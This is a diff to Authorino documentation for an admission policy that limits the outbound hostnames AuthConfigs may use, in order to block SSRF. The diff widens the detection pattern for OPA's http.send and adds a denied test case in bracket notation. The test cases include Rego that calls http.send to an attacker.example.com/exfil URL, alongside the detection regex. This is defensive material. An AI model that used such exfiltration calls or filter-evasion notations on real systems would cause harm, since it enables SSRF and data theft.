@@ -15,24 +15,21 @@ name a hostname that the requesting subject has been granted.
 
 There are exactly **two roles**:
 
-| Role | RBAC rule | What it gives you |
-| --- | --- | --- |
-| `authorino-trusted-hostnames` | `set-hostname` on `authconfigs/<hostname>` | Permission to reference that one hostname from an `AuthConfig`. Add one entry per allowed host. |
-| `authorino-unrestricted-hostnames` | `set-untrusted-hostname` on `unrestricted-hostnames` | A full bypass. The policy is skipped entirely for this subject. It also covers dynamic hostnames — a `urlExpression`, or a templated `{selector}` in the host — which resolve only at request time and so cannot be checked against an allowlist. |
+| Role                               | RBAC rule                                            | What it gives you                                                                                                                                                                                                                                     |
+|------------------------------------|------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
+| `authorino-trusted-hostnames`      | `set-hostname` on `authconfigs/<hostname>`           | Permission to reference that one hostname from an `AuthConfig`. Add one entry per allowed host.                                                                                                                                                       |
+| `authorino-unrestricted-hostnames` | `set-untrusted-hostname` on `unrestricted-hostnames` | A full bypass. The policy is skipped entirely for this subject. It also covers dynamic hostnames, such as `urlExpression`, or a templated `{selector}` in the host, which resolve only at request time and so cannot be checked against an allowlist. |
 
 The policy runs four checks, in order. The first one that fails rejects the
 request:
 
-| # | Check | Denies |
-| --- | --- | --- |
-| 1 | `!usesHttpSend` | Inline OPA/Rego (`spec.authorization.*.opa.rego`) that uses the `http.send` builtin. |
-| 2 | `!usesExternalOpa` | OPA policies loaded from an external source (`spec.authorization.*.opa.externalPolicy`). The Rego is fetched at runtime, so it cannot be scanned for `http.send` at admission time. |
-| 3 | `!hasUnverifiableEndpoint` | Endpoints whose host cannot be read statically: a dynamic `urlExpression`, or a URL with a templated `{...}` hostname. |
-| 4 | `requestedHosts.all(...)` | Any hostname the subject has not been granted `set-hostname` on. Covers JWT `jwksUrl` / `issuerUrl`, OAuth2 introspection `endpoint`, UserInfo `userInfoUrl`, UMA `endpoint`, metadata and callback `http.url` + `http.oauth2.tokenUrl`, and SpiceDB `endpoint`. |
+| # | Check                      | Denies                                                                                                                                                                                                                                                           |
+|---|----------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
+| 1 | `!usesHttpSend`            | Inline OPA/Rego (`spec.authorization.*.opa.rego`) that references send attribute in the `http` builtin namespace.                                                                                                                                                |
+| 2 | `!usesExternalOpa`         | OPA policies loaded from an external source (`spec.authorization.*.opa.externalPolicy`). The Rego is fetched at runtime, so it cannot be scanned for `http.send` at admission time.                                                                              |
+| 3 | `!hasUnverifiableEndpoint` | Endpoints whose host cannot be read statically: a dynamic `urlExpression`, or a URL with a templated `{...}` hostname.                                                                                                                                           |
+| 4 | `requestedHosts.all(...)`  | Any hostname the subject has not been granted `set-hostname` on. Covers JWT `jwksUrl` / `issuerUrl`, OAuth2 introspection `endpoint`, UserInfo `userInfoUrl`, UMA `endpoint`, metadata and callback `http.url` + `http.oauth2.tokenUrl`, and SpiceDB `endpoint`. |
 
-Checks 1, 2 and 3 have no per-feature role. If you need any of them, you need the
-`authorino-unrestricted-hostnames` role. That is deliberate: either you stay
-inside a static allowlist, or you get everything. There is no middle tier.
 
 ## Prerequisites
 
@@ -164,7 +161,7 @@ spec:
         && object.spec.authorization.exists(k,
         has(object.spec.authorization[k].opa)
         && has(object.spec.authorization[k].opa.rego)
-        && object.spec.authorization[k].opa.rego.contains("http.send"))
+        && object.spec.authorization[k].opa.rego.matches(r'(^|[^A-Za-z0-9_.])http[.\[]'))
     - name: usesExternalOpa
       expression: >-
         has(object.spec.authorization)
@@ -244,7 +241,7 @@ spec:
   validations:
     - expression: "!variables.usesHttpSend"
       reason: Forbidden
-      message: "inline OPA/Rego policies (spec.authorization[*].opa.rego) must not use the 'http.send' builtin, which lets Authorino make arbitrary outbound HTTP requests (SSRF). Fetch external data via a metadata HTTP source with an allowlisted hostname instead, or ask an admin for the 'unrestricted-hostnames' role."
+      message: "inline OPA/Rego policies (spec.authorization[*].opa.rego) must not reference the 'send' attribute in the 'http' builtin namespace, which lets Authorino make arbitrary outbound HTTP requests (SSRF). Fetch external data via a metadata HTTP source with an allowlisted hostname instead, or ask an admin for the 'unrestricted-hostnames' role."
     - expression: "!variables.usesExternalOpa"
       reason: Forbidden
       message: "OPA policies loaded from an external source (spec.authorization[*].opa.externalPolicy) are not allowed: the Rego is fetched at runtime and cannot be scanned for the 'http.send' builtin at admission time (SSRF). Use an inline 'rego' policy, which is scanned, or ask an admin for the 'unrestricted-hostnames' role."
@@ -355,6 +352,26 @@ spec:
       opa:
         rego: |
           resp := http.send({"method": "get", "url": "https://attacker.example.com/exfil"})
+          allow { resp.status_code == 200 }
+EOF
+```
+
+```bash
+# The same call written in bracket notation — also DENIED
+kubectl apply --as=<unauthorized-subject> -f - <<'EOF'
+apiVersion: authorino.kuadrant.io/v1beta3
+kind: AuthConfig
+metadata:
+  name: route-denied-httpsend-bracket
+  namespace: <namespace>
+spec:
+  hosts:
+    - test-httpsend-bracket-denied.example.com
+  authorization:
+    external-check:
+      opa:
+        rego: |
+          resp := http["send"]({"method": "get", "url": "https://attacker.example.com/exfil"})
           allow { resp.status_code == 200 }
 EOF
 ```
@@ -593,25 +610,3 @@ spec:
         issuerUrl: https://keycloak.example.com/realms/app
 EOF
 ```
-
-## Limitations
-
-- **Exact hostname match only.** There is no wildcard form. `*.example.com` is not
-  supported; list each host.
-- **Case-sensitive.** `KEYCLOAK.example.com` does not match a grant for
-  `keycloak.example.com`. It is denied.
-- **Hostname only.** A grant does not restrict the port, path or scheme on that
-  host.
-- **`urlExpression` always needs the bypass role.** Check 3 denies it in every
-  shape, including a fixed host with a varying path. There is no separate role for
-  it, on purpose.
-- **Only templated *hostnames* are denied.** A `{selector}` in the path is fine:
-  `https://keycloak.example.com/{context.request.http.path}` is admitted for a
-  subject granted that host.
-- **A wildcard RBAC rule grants both roles.** A subject with `resources: ["*"]`
-  and `verbs: ["*"]` on the `authorino.kuadrant.io` API group satisfies both the
-  `set-hostname` and the `set-untrusted-hostname` check, so it bypasses everything
-  silently. This is how
-  cluster admins are exempt. Note that `resources: ["authconfigs"]` with
-  `verbs: ["*"]` does **not** bypass the policy — the check is on the
-  `authconfigs/<hostname>` subresource, which that rule does not cover.
